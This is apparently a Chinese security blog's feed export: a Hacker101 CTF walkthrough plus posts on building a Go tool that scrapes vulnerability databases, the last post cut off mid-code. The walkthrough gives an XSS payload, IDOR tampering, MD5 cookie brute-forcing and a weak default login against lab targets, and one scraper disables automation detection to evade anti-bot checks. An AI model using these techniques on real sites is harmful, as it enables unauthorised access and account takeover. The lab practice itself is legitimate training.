    <link href="/2024/07/23/hacker101/"/>
    <url>/2024/07/23/hacker101/</url>
    
    <content type="html"><![CDATA[<h1 id="hacker101"><a href="#hacker101" class="headerlink" title="hacker101"></a>hacker101</h1><p>在 hackerone 中，如果 hacker101 的分数达到一定值，就有机会参加 private programs，因此记录一下 hacker101 的 walkthrough。<br><a href="https://ctf.hacker101.com/ctf">Hacker101 CTF</a></p><h2 id="A-little-something-to-get-you-started"><a href="#A-little-something-to-get-you-started" class="headerlink" title="A little something to get you started"></a>A little something to get you started</h2><p><img src="/2023/04/27/file-upload/age-20240424103549369.png"><br>查看源代码：<br><img src="/2023/04/27/file-upload/age-20240424103601348.png"><br>访问&#x2F;background.png:<br><img src="/2023/04/27/file-upload/age-20240424103620489.png"></p><h2 id="Micro-CMS-v1"><a href="#Micro-CMS-v1" class="headerlink" title="Micro-CMS v1"></a>Micro-CMS v1</h2><p>有 3 个功能点。<br><img src="/2023/04/27/file-upload/age-20240424110010854.png"><br>新建一个页面，输入 xss payload：<br><img src="/2023/04/27/file-upload/age-20240424105928448.png"><br>得到第一个 flag。<br>点击 Testing：</p><p><img src="/2023/04/27/file-upload/age-20240424110006868.png"><br>看到 url 中有数字参数，加上’，无变化。<br>edit this page，加上’，访问 <code>https://6bc560c8dec5d882206c651b05c2fc35.ctf.hacker101.com/page/edit/1 &#39; </code><br><img src="/2023/04/27/file-upload/age-20240424110123762.png"><br>得到第二个 flag。<br>点击 markdown test：<br><img src="/2023/04/27/file-upload/age-20240424110158880.png"><br>点击 some button，无变化。<br>Edit this page：<br><img src="/2023/04/27/file-upload/age-20240424110223874.png"><br>markdown is supported，but scripts are not，因此利用 payload：<code>&lt;img src=x onerror=alert()&gt;</code><br><img src="/2023/04/27/file-upload/age-20240424111956971.png"><br>查看源代码：<br><img src="/2023/04/27/file-upload/age-20240424112023689.png"><br>拿到第三个 flag。<br>对&#x2F;page&#x2F;§1§进行遍历，到 4 的时候出现 403：<br><img src="/2023/04/27/file-upload/age-20240424111356698.png"><br>再对&#x2F;page&#x2F;edit&#x2F;§1§遍历：<br><img src="/2023/04/27/file-upload/age-20240424111438093.png"><br>拿到第四个 flag。</p><h2 id="postbook"><a href="#postbook" class="headerlink" title="postbook"></a>postbook</h2><p>首先注册一个账号，发帖时回带上 userid：<br><img src="/2023/04/27/file-upload/age-20240424112703612.png"><br>考虑越权发帖，修改 id：<br><img src="/2023/04/27/file-upload/age-20240424112726598.png"><br>拿到 flag0.<br>编辑文章同理：<br><img src="/2023/04/27/file-upload/age-20240424113016119.png"><br>flag1.<br>删除也存在越权：<br><img src="/2023/04/27/file-upload/age-20240424114536681.png"><br>这里爆破的时候加上 md5 加密：<br><img src="/2023/04/27/file-upload/age-20240424114554127.png"><br>flag2.<br>查看文章时，url 带 id，遍历：<br><img src="/2023/04/27/file-upload/age-20240424113928365.png"><br>flag3.<br>观察数据包，发现 cookie 同样是 md5 加密，爆破 cookie：<br><img src="/2023/04/27/file-upload/age-20240424114820923.png"><br><img src="/2023/04/27/file-upload/age-20240424114830058.png"><br>flag4.<br>退出登录后，user 用户存在弱口令：<br>user&#x2F;password<br><img src="/2023/04/27/file-upload/age-20240424120609507.png"><br>最后一个 flag，查看提示：<br><img src="/2023/04/27/file-upload/age-20240424120316439.png"><br>越权查看文章时，id 改为 945：<br><img src="/2023/04/27/file-upload/age-20240424120333189.png"><br>flag6.</p>]]></content>
    
    
    <categories>
      
      <category>ctf</category>
      
    </categories>
    
    
    <tags>
      
      <tag>ctf</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>golang实现漏洞监控05——0day漏洞信息监控</title>
    <link href="/2024/07/23/golang%E5%AE%9E%E7%8E%B0%E6%BC%8F%E6%B4%9E%E7%9B%91%E6%8E%A705%E2%80%94%E2%80%940day%E6%BC%8F%E6%B4%9E%E4%BF%A1%E6%81%AF%E7%9B%91%E6%8E%A7/"/>
    <url>/2024/07/23/golang%E5%AE%9E%E7%8E%B0%E6%BC%8F%E6%B4%9E%E7%9B%91%E6%8E%A705%E2%80%94%E2%80%940day%E6%BC%8F%E6%B4%9E%E4%BF%A1%E6%81%AF%E7%9B%91%E6%8E%A7/</url>
    
    <content type="html"><![CDATA[<h1 id="golang实现漏洞监控05——0day漏洞信息监控"><a href="#golang实现漏洞监控05——0day漏洞信息监控" class="headerlink" title="golang实现漏洞监控05——0day漏洞信息监控"></a>golang实现漏洞监控05——0day漏洞信息监控</h1><p>近日在找漏洞相关信息时，看到了这个网站:<a href="https://sploitus.com/">https://sploitus.com</a></p><p><img src="/2023/04/27/file-upload/mage-20240229140308882.png" alt="image-20240229140308882"></p><p>翻阅一番后发现，该平台是将多个源的漏洞进行了整合，例如github,exploit-db,0day.today,packetstorm,metasploit等等，其中大部分在crush项目中已经完成了覆盖，除了0day.today和packetstorm，与其爬取他人的聚合信息，不如直接监控源平台，因此有了这篇文章。</p><h2 id="爬取逻辑"><a href="#爬取逻辑" class="headerlink" title="爬取逻辑"></a>爬取逻辑</h2><p>首先打开首页：0day.today</p><p><img src="/2023/04/27/file-upload/mage-20240229141107918.png" alt="image-20240229141107918"></p><p>要点击Yes，I agree才能继续访问.</p><p>点击后，还会有一个弹窗：</p><p><img src="/2023/04/27/file-upload/mage-20240229141252689.png" alt="image-20240229141252689"></p><p>在关闭该弹窗后，才能看到正常的exploit信息。</p><p>考虑到这里有两次点击操作，因此结合chromedp来进行。</p><p>点击一些漏洞的第一列，DATE：</p><p><img src="/2023/04/27/file-upload/mage-20240229141440661.png" alt="image-20240229141440661"></p><p>跳转到<a href="https://0day.today/date/17-03-2022%EF%BC%8C%E5%8F%91%E7%8E%B0%E6%98%AF%E4%BB%A5%E6%97%B6%E9%97%B4%E5%91%BD%E5%90%8D%E7%9A%84%EF%BC%8C%E6%89%80%E4%BB%A5%E6%83%B3%E8%A6%81%E7%9B%91%E6%8E%A7%E6%AF%8F%E5%A4%A9%E7%9A%84%E6%9B%B4%E6%96%B0%EF%BC%8C%E7%9B%B4%E6%8E%A5%E8%AE%BF%E9%97%AE%E4%B8%80%E6%AC%A1%E5%89%8D%E4%B8%80%E5%A4%A9%E6%97%B6%E9%97%B4%E7%9A%84URL%E5%8D%B3%E5%8F%AF%E3%80%82">https://0day.today/date/17-03-2022，发现是以时间命名的，所以想要监控每天的更新，直接访问一次前一天时间的URL即可。</a></p><p> 先通过chromedp.Click()来模拟点击事件：</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs stylus">ctx, _ := chromedp<span class="hljs-selector-class">.NewExecAllocator</span>(context<span class="hljs-selector-class">.Background</span>(),<br><span class="hljs-built_in">append</span>(<br>chromedp<span class="hljs-selector-class">.DefaultExecAllocatorOptions</span><span class="hljs-selector-attr">[:]</span>,<br>chromedp<span class="hljs-selector-class">.Flag</span>(<span class="hljs-string">&quot;headless&quot;</span>, false),<br>chromedp<span class="hljs-selector-class">.Flag</span>(<span class="hljs-string">&quot;enable-automation&quot;</span>, false),<br>chromedp<span class="hljs-selector-class">.Flag</span>(<span class="hljs-string">&quot;disable-blink-features&quot;</span>, <span class="hljs-string">&quot;AutomationControlled&quot;</span>),<br>)...,<br>)<br>ctx, _ = chromedp<span class="hljs-selector-class">.NewContext</span>(ctx)<br><br>ctx, cancel := context<span class="hljs-selector-class">.WithTimeout</span>(ctx, <span class="hljs-number">600</span>*<span class="hljs-selector-tag">time</span>.Second)<br>defer <span class="hljs-built_in">cancel</span>()<br><span class="hljs-selector-tag">var</span> result string<br>url := fmt<span class="hljs-selector-class">.Sprintf</span>(<span class="hljs-string">&quot;https://0day.today/date/17-03-2022&quot;</span>)<br>agree_xpath := <span class="hljs-string">&quot;/html/body/div/div[1]/div[14]/div[3]/form/input&quot;</span><br>close_xpath := <span class="hljs-string">&quot;/html/body/div[5]/div/div/a&quot;</span><br>err := chromedp<span class="hljs-selector-class">.Run</span>(ctx,<br>chromedp<span class="hljs-selector-class">.Navigate</span>(url),<br>chromedp<span class="hljs-selector-class">.WaitVisible</span>(agree_xpath, chromedp.BySearch),<br>chromedp<span class="hljs-selector-class">.Click</span>(agree_xpath),<br>chromedp<span class="hljs-selector-class">.WaitVisible</span>(close_xpath, chromedp.BySearch),<br>chromedp<span class="hljs-selector-class">.Click</span>(close_xpath),<br>chromedp<span class="hljs-selector-class">.InnerHTML</span>(<span class="hljs-string">&quot;html&quot;</span>, &amp;result),<br>)<br><span class="hljs-keyword">if</span> err != nil &#123;<br>errMsg := fmt<span class="hljs-selector-class">.Sprintf</span>(<span class="hljs-string">&quot;crawling %v err:%v&quot;</span>, url, err)<br>log<span class="hljs-selector-class">.Println</span>(errMsg)<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="/2023/04/27/file-upload/mage-20240229144333120.png" alt="image-20240229144333120"></p><p>正常。</p><p>下面通过goquery来解析数据</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs stylus">doc, err := goquery<span class="hljs-selector-class">.NewDocumentFromReader</span>(strings<span class="hljs-selector-class">.NewReader</span>(result))<br><span class="hljs-keyword">if</span> err != nil &#123;<br>log<span class="hljs-selector-class">.Fatal</span>(err)<br>&#125;<br><br>doc<span class="hljs-selector-class">.Find</span>(<span class="hljs-string">&quot;.ExploitTableContent&quot;</span>)<span class="hljs-selector-class">.Each</span>(<span class="hljs-built_in">func</span>(<span class="hljs-selector-tag">i</span> int, s *goquery.Selection) &#123;<br>date := s<span class="hljs-selector-class">.Find</span>(<span class="hljs-string">&quot;.td a&quot;</span>)<span class="hljs-selector-class">.First</span>()<span class="hljs-selector-class">.Text</span>()<br>title := s<span class="hljs-selector-class">.Find</span>(<span class="hljs-string">&quot;h3 a&quot;</span>)<span class="hljs-selector-class">.Text</span>()<br>category := s<span class="hljs-selector-class">.Find</span>(<span class="hljs-string">&quot;a[href^=&#x27;/platforms&#x27;]&quot;</span>)<span class="hljs-selector-class">.Text</span>()<br>risk := s<span class="hljs-selector-class">.Find</span>(<span class="hljs-string">&quot;[class*=tips_risk_color_]&quot;</span>)<span class="hljs-selector-class">.Text</span>()<br>cve := s<span class="hljs-selector-class">.Find</span>(<span class="hljs-string">&quot;a[href^=&#x27;/cve&#x27;]&quot;</span>)<span class="hljs-selector-class">.Next</span>()<span class="hljs-selector-class">.Text</span>()<br>price := s<span class="hljs-selector-class">.Find</span>(<span class="hljs-string">&quot;.tips_price_0&quot;</span>)<span class="hljs-selector-class">.Text</span>()<br>&#125;)<br></code></pre></td></tr></table></figure><p>通过<code>s.Find(&quot;a[href^=&#39;/cve&#39;]&quot;).Next().Text()</code>来判断是否有CVE编号，通过price是否为free来判断是否有公开exploit。</p><h2 id="实现效果"><a href="#实现效果" class="headerlink" title="实现效果"></a>实现效果</h2><p>包含更新日期，分类，严重程度，CVE信息，是否公开，漏洞标题等等：</p><p><img src="/2023/04/27/file-upload/mage-20240229140810342.png" alt="image-20240229140810342"></p><p>预计在crush V1.1中合入该平台监控。</p>]]></content>
    
    
    <categories>
      
      <category>crush</category>
      
    </categories>
    
    
    <tags>
      
      <tag>crush</tag>
      
      <tag>golang</tag>
      
      <tag>0day.today</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>golang 实现漏洞监控04——seebug 漏洞信息监控</title>
    <link href="/2024/07/23/golang%E5%AE%9E%E7%8E%B0%E6%BC%8F%E6%B4%9E%E7%9B%91%E6%8E%A704%E2%80%94%E2%80%94seebug%E6%BC%8F%E6%B4%9E%E4%BF%A1%E6%81%AF%E7%9B%91%E6%8E%A7/"/>
    <url>/2024/07/23/golang%E5%AE%9E%E7%8E%B0%E6%BC%8F%E6%B4%9E%E7%9B%91%E6%8E%A704%E2%80%94%E2%80%94seebug%E6%BC%8F%E6%B4%9E%E4%BF%A1%E6%81%AF%E7%9B%91%E6%8E%A7/</url>
    
    <content type="html"><![CDATA[<h1 id="golang-实现漏洞监控04——seebug-漏洞信息监控"><a href="#golang-实现漏洞监控04——seebug-漏洞信息监控" class="headerlink" title="golang 实现漏洞监控04——seebug 漏洞信息监控"></a>golang 实现漏洞监控04——seebug 漏洞信息监控</h1><h2 id="整体功能"><a href="#整体功能" class="headerlink" title="整体功能"></a>整体功能</h2><p>先看一段最简单的 get 请求：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;  <br>    url := <span class="hljs-string">&quot;https://www.seebug.org/vuldb/vulnerabilities?page=1&quot;</span>  <br>    res, err := http.Get(url)  <br>    <span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;  <br>       fmt.Println(<span class="hljs-string">&quot;Error request:&quot;</span>, err)  <br>       <span class="hljs-keyword">return</span>  <br>    &#125;  <br>    <span class="hljs-keyword">defer</span> res.Body.Close()  <br>  <br>    body, _ := ioutil.ReadAll(res.Body)  <br>    fmt.Println(<span class="hljs-type">string</span>(body))  <br>&#125;<br></code></pre></td></tr></table></figure><p>GET 方法访问 seebug 漏洞库，打印出的结果如下：<br><img src="/2023/04/27/file-upload/image-20240126131752248.png"><br>这是一段 js 混淆的代码，而不是期望的 html 数据。<br><img src="/2023/04/27/file-upload/image-20240126131851302.png"><br>curl 的结果同样如此，随后尝试用 burp 补全正常请求的参数，依然无法得到正确的数据。<br>因此考虑使用 chromedp 来进行访问。</p><h3 id="chromedp"><a href="#chromedp" class="headerlink" title="chromedp"></a>chromedp</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs cardlink">url: https://github.com/chromedp/chromedp<br>title: &quot;GitHub - chromedp/chromedp: A faster, simpler way to drive browsers supporting the Chrome DevTools Protocol.&quot;<br>description: &quot;A faster, simpler way to drive browsers supporting the Chrome DevTools Protocol. - GitHub - chromedp/chromedp: A faster, simpler way to drive browsers supporting the Chrome DevTools Protocol.&quot;<br>host: github.com<br>favicon: https://github.githubcrush_seebug.com/favicons/favicon.svg<br>image: https://opengraph.githubcrush_seebug.com/d4bf4b8aff3b3b26f607fb6f006cf4bda0646c39debab713acbccfb851de2080/chromedp/chromedp<br></code></pre></td></tr></table></figure><p>先看一段 demo，通过 chromedp 来访问百度并且搜索特定内容，再点击搜索按钮：</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs stylus">package <span class="hljs-selector-tag">main</span>  <br>  <br>import (  <br>    <span class="hljs-string">&quot;context&quot;</span>  <br>    <span class="hljs-string">&quot;fmt&quot;</span>    <span class="hljs-string">&quot;github.com/chromedp/chromedp&quot;</span>)  <br>  <br>func <span class="hljs-selector-tag">main</span>() &#123;  <br>    ctx, _ := chromedp<span class="hljs-selector-class">.NewExecAllocator</span>(context<span class="hljs-selector-class">.Background</span>(),  <br>       <span class="hljs-built_in">append</span>(  <br>          chromedp<span class="hljs-selector-class">.DefaultExecAllocatorOptions</span><span class="hljs-selector-attr">[:]</span>, chromedp<span class="hljs-selector-class">.Flag</span>(<span class="hljs-string">&quot;headless&quot;</span>, false), chromedp<span class="hljs-selector-class">.Flag</span>(<span class="hljs-string">&quot;enable-automation&quot;</span>, false),  <br>       )...,  <br>    )  <br>    ctx, _ = chromedp<span class="hljs-selector-class">.NewContext</span>(ctx)  <br>    chromedp<span class="hljs-selector-class">.Run</span>(ctx, chromedp<span class="hljs-selector-class">.Navigate</span>(<span class="hljs-string">&quot;http://www.baidu.com&quot;</span>))  <br>  <br>    chromedp<span class="hljs-selector-class">.Run</span>(ctx, chromedp<span class="hljs-selector-class">.SendKeys</span>(`#kw`, <span class="hljs-string">&quot;111&quot;</span>, chromedp.ByID))  <br>    fmt<span class="hljs-selector-class">.Println</span>(<span class="hljs-string">&quot;wait for 2 seconds&quot;</span>)  <br>    chromedp<span class="hljs-selector-class">.Run</span>(ctx, chromedp<span class="hljs-selector-class">.WaitVisible</span>(`#su`, chromedp.ByID))  <br>    chromedp<span class="hljs-selector-class">.Run</span>(ctx, chromedp<span class="hljs-selector-class">.Click</span>(`document<span class="hljs-selector-class">.querySelector</span>(<span class="hljs-string">&quot;#su&quot;</span>)`, chromedp.ByJSPath))  <br>  <br>&#125;<br></code></pre></td></tr></table></figure><p>首先是新建一个执行上下文，通过 append 来覆盖 options 中的一些参数，DefaultExecAllocatorOptions 的默认配置如下：</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-selector-tag">var</span> DefaultExecAllocatorOptions = <span class="hljs-selector-attr">[...]</span>ExecAllocatorOption&#123;  <br>NoFirstRun,  <br>NoDefaultBrowserCheck,  <br>Headless,  <br>  <br><span class="hljs-built_in">Flag</span>(<span class="hljs-string">&quot;disable-background-networking&quot;</span>, true),  <br><span class="hljs-built_in">Flag</span>(<span class="hljs-string">&quot;enable-features&quot;</span>, <span class="hljs-string">&quot;NetworkService,NetworkServiceInProcess&quot;</span>),  <br><span class="hljs-built_in">Flag</span>(<span class="hljs-string">&quot;disable-background-timer-throttling&quot;</span>, true),  <br><span class="hljs-built_in">Flag</span>(<span class="hljs-string">&quot;disable-backgrounding-occluded-windows&quot;</span>, true),  <br><span class="hljs-built_in">Flag</span>(<span class="hljs-string">&quot;disable-breakpad&quot;</span>, true),  <br><span class="hljs-built_in">Flag</span>(<span class="hljs-string">&quot;disable-client-side-phishing-detection&quot;</span>, true),  <br><span class="hljs-built_in">Flag</span>(<span class="hljs-string">&quot;disable-default-apps&quot;</span>, true),  <br><span class="hljs-built_in">Flag</span>(<span class="hljs-string">&quot;disable-dev-shm-usage&quot;</span>, true),  <br><span class="hljs-built_in">Flag</span>(<span class="hljs-string">&quot;disable-extensions&quot;</span>, true),  <br><span class="hljs-built_in">Flag</span>(<span class="hljs-string">&quot;disable-features&quot;</span>, <span class="hljs-string">&quot;site-per-process,Translate,BlinkGenPropertyTrees&quot;</span>),  <br><span class="hljs-built_in">Flag</span>(<span class="hljs-string">&quot;disable-hang-monitor&quot;</span>, true),  <br><span class="hljs-built_in">Flag</span>(<span class="hljs-string">&quot;disable-ipc-flooding-protection&quot;</span>, true),  <br><span class="hljs-built_in">Flag</span>(<span class="hljs-string">&quot;disable-popup-blocking&quot;</span>, true),  <br><span class="hljs-built_in">Flag</span>(<span class="hljs-string">&quot;disable-prompt-on-repost&quot;</span>, true),  <br><span class="hljs-built_in">Flag</span>(<span class="hljs-string">&quot;disable-renderer-backgrounding&quot;</span>, true),  <br><span class="hljs-built_in">Flag</span>(<span class="hljs-string">&quot;disable-sync&quot;</span>, true),  <br><span class="hljs-built_in">Flag</span>(<span class="hljs-string">&quot;force-color-profile&quot;</span>, <span class="hljs-string">&quot;srgb&quot;</span>),  <br><span class="hljs-built_in">Flag</span>(<span class="hljs-string">&quot;metrics-recording-only&quot;</span>, true),  <br><span class="hljs-built_in">Flag</span>(<span class="hljs-string">&quot;safebrowsing-disable-auto-update&quot;</span>, true),  <br><span class="hljs-built_in">Flag</span>(<span class="hljs-string">&quot;enable-automation&quot;</span>, true),  <span class="hljs-comment">// 会显示自动化测试标识  </span><br><span class="hljs-built_in">Flag</span>(<span class="hljs-string">&quot;password-store&quot;</span>, <span class="hljs-string">&quot;basic&quot;</span>),  <br><span class="hljs-built_in">Flag</span>(<span class="hljs-string">&quot;use-mock-keychain&quot;</span>, true),  <br>&#125;<br></code></pre></td></tr></table></figure><p>headless 参数如果设置为 false，就会打开一个窗口，反之则无，为了调试方便这里将参数设置为 false。<br>通过 chromedp.Navigate()导航到 baidu，再通过 chromedp.SendKeys()模拟键盘输入，QueryOptions 设置为 ByID，再找到 id 为 kw 的部分，实现了在搜索框中输入内容：<br><img src="/2023/04/27/file-upload/image-20240126140736499.png"><br>接着通过 chromedp.WaitVisible()等待搜索按钮出现，并进行点击：<br><img src="/2023/04/27/file-upload/image-20240126141158241.png"><br>最终结果如下：<br><img src="/2023/04/27/file-upload/image-20240126140926830.png"><br>下面尝试访问 seebug。<br><img src="/2023/04/27/file-upload/image-20240126141631453.png"><br>chrome 打开了一个空白网页，可能是有反爬的逻辑，在 options 中添加头：<code>chromedp.Flag(&quot;disable-blink-features&quot;, &quot;AutomationControlled&quot;),</code> 即可。<br><img src="/2023/04/27/file-upload/image-20240126142002894.png"><br>在控制台中查看 window.navigator.webdriver，可以发现不加参数时为 true，加上参数之后 webdriver 变为 false。<br><img src="/2023/04/27/file-upload/image-20240126142320638.png"><br>目前已经能够正常访问，尝试打印出 html 内容：<br><img src="/2023/04/27/file-upload/image-20240126142707838.png"><br>可以看到网页还在加载，打印出的内容依然是混淆的 js 数据。<br>这里只需要 sleep 一段时间等待网页加载完成就好：<br><img src="/2023/04/27/file-upload/image-20240126143131960.png"><br>或者使用更高效的方法，例如等待第一个漏洞的漏洞名称加载完再打印：</p><figure class="highlight crmsh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs crmsh"><span class="hljs-keyword">xpath</span> := <span class="hljs-string">&quot;/html/body/div[2]/div/div/div/div/table/tbody/tr[1]/td[4]/a&quot;</span><br>chromedp.WaitVisible(<span class="hljs-keyword">xpath</span>, chromedp.BySearch),<br></code></pre></td></tr></table></figure><p>能够拿到正确的html之后，进行解析提取出想要的信息即可。</p><h2 id="爬取逻辑"><a href="#爬取逻辑" class="headerlink" title="爬取逻辑"></a>爬取逻辑</h2><p>每天凌晨通过chromedp访问seebug漏洞库第一页的内容，通过提交时间判断是否为新漏洞，如果是则插入数据库。</p><h2 id="实现效果"><a href="#实现效果" class="headerlink" title="实现效果"></a>实现效果</h2><p><img src="/2023/04/27/file-upload/image-20240229134844024.png" alt="image-20240229134844024"></p><p>目前seebug源的监控已经加入crush项目:<a href="https://github.com/leesinz/crush">https://github.com/leesinz/crush</a></p>]]></content>
    
    
    <categories>
      
      <category>crush</category>
      
    </categories>
    
    
    <tags>
      
      <tag>crush</tag>
      
      <tag>golang</tag>
      
      <tag>seebug</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>golang 实现漏洞监控03——metasploit 漏洞信息监控</title>
    <link href="/2024/07/23/golang%E5%AE%9E%E7%8E%B0%E6%BC%8F%E6%B4%9E%E7%9B%91%E6%8E%A703%E2%80%94%E2%80%94metasploit%E6%BC%8F%E6%B4%9E%E4%BF%A1%E6%81%AF%E7%9B%91%E6%8E%A7/"/>
    <url>/2024/07/23/golang%E5%AE%9E%E7%8E%B0%E6%BC%8F%E6%B4%9E%E7%9B%91%E6%8E%A703%E2%80%94%E2%80%94metasploit%E6%BC%8F%E6%B4%9E%E4%BF%A1%E6%81%AF%E7%9B%91%E6%8E%A7/</url>
    
    <content type="html"><![CDATA[<h1 id="golang-实现漏洞监控03——metasploit-漏洞信息监控"><a href="#golang-实现漏洞监控03——metasploit-漏洞信息监控" class="headerlink" title="golang 实现漏洞监控03——metasploit 漏洞信息监控"></a>golang 实现漏洞监控03——metasploit 漏洞信息监控</h1><h2 id="整体功能"><a href="#整体功能" class="headerlink" title="整体功能"></a>整体功能</h2><p>监控 metasploit 官方的 github 源，如果有更新，则通过脚本处理，筛选出是否为 exploit，是否有 cve 号等等，并通过邮件推送。</p><h2 id="代码逻辑"><a href="#代码逻辑" class="headerlink" title="代码逻辑"></a>代码逻辑</h2><p><img src="/2023/04/27/file-upload/age-20240124120435006.png"><br>首先通过 init 参数，将 metasploit 仓库 clone 到本地，接着通过 monitor 参赛来进行日常监控。<br>完整的流程如图所示，主要看一下 check 的部分。</p> <figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><code class="hljs stylus"> func <span class="hljs-built_in">CheckMSFUpdate</span>() &#123;  <br>    result := <span class="hljs-string">&quot;&quot;</span>  <br>    file, err := os<span class="hljs-selector-class">.Open</span>(updateInfoPath)  <br>    <span class="hljs-keyword">if</span> err != nil &#123;  <br>       fmt<span class="hljs-selector-class">.Println</span>(<span class="hljs-string">&quot;open file err:&quot;</span>, err)  <br>       return  <br>    &#125;  <br>    defer file<span class="hljs-selector-class">.Close</span>()  <br>  <br>    scanner := bufio<span class="hljs-selector-class">.NewScanner</span>(file)  <br>    <span class="hljs-keyword">for</span> scanner<span class="hljs-selector-class">.Scan</span>() &#123;  <br>       <span class="hljs-selector-tag">line</span> := scanner<span class="hljs-selector-class">.Text</span>()  <br>       <span class="hljs-keyword">if</span> upToDate<span class="hljs-selector-class">.MatchString</span>(line) &#123;  <br>          <span class="hljs-comment">//fmt.Println(&quot;Already up to date.&quot;)  </span><br>          result += <span class="hljs-string">&quot;Already up to date.&quot;</span>  <br>       &#125;  <br>  <br>       <span class="hljs-keyword">if</span> newExploitInfo<span class="hljs-selector-class">.MatchString</span>(line) &#123;  <br>          cveFlag := <span class="hljs-string">&quot;&quot;</span>  <br>          newFilePath := newExploitInfo<span class="hljs-selector-class">.FindStringSubmatch</span>(line)<span class="hljs-selector-attr">[1]</span>  <br>          file, err := os<span class="hljs-selector-class">.Open</span>(msfDir + <span class="hljs-string">&quot;/&quot;</span> + newFilePath)  <br>          <span class="hljs-keyword">if</span> err != nil &#123;  <br>             fmt<span class="hljs-selector-class">.Println</span>(<span class="hljs-string">&quot;Error opening file:&quot;</span>, err)  <br>             return  <br>          &#125;  <br>          scanner := bufio<span class="hljs-selector-class">.NewScanner</span>(file)  <br>          <span class="hljs-keyword">for</span> scanner<span class="hljs-selector-class">.Scan</span>() &#123;  <br>             rbLine := scanner<span class="hljs-selector-class">.Text</span>()  <br>             <span class="hljs-keyword">if</span> cvePattern<span class="hljs-selector-class">.MatchString</span>(rbLine) &#123;  <br>                sub := cvePattern<span class="hljs-selector-class">.FindStringSubmatch</span>(rbLine)  <br>                cve := sub<span class="hljs-selector-attr">[1]</span> + <span class="hljs-string">&quot;-&quot;</span> + sub<span class="hljs-selector-attr">[2]</span>  <br>                newCVEInfos<span class="hljs-selector-attr">[cve]</span> = newFilePath  <br>                cveFlag = cve + <span class="hljs-string">&quot;:&quot;</span>  <br>             &#125;  <br>          &#125;  <br>          result += cveFlag + newFilePath + <span class="hljs-string">&quot;\n&quot;</span>  <br>       &#125;  <br>    &#125;  <br>    <span class="hljs-comment">//fmt.Println(result)  </span><br>    now := <span class="hljs-selector-tag">time</span><span class="hljs-selector-class">.Now</span>()<span class="hljs-selector-class">.Format</span>(<span 